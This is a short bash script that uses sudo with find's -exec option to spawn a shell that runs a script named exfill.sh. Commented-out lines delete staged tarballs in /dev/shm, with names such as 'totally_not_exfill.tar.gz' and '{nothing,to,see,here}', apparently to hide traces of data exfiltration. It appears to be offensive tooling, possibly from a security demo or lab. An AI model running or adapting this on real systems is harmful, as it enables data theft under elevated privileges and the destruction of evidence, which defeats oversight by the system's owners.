#!/bin/bash

HOMEDIR='/home/ericcobb'

sudo $(which find) . -exec /bin/sh -c /home/ericcobb/scripts/exfill.sh \; -quit
#$(which find) . -exec sudo /bin/sh -c /home/ericcobb/scripts/exfill.sh \; -quit

#if [ $? -eq 0 ]; then
#  sleep 5
#  /usr/bin/rm -f /dev/shm/demo_progs.tar
#  /usr/bin/rm -f /dev/shm/totally_not_exfill.tar.gz
#  /usr/bin/rm -f /dev/shm/{nothing,to,see,here}
#fi

exit
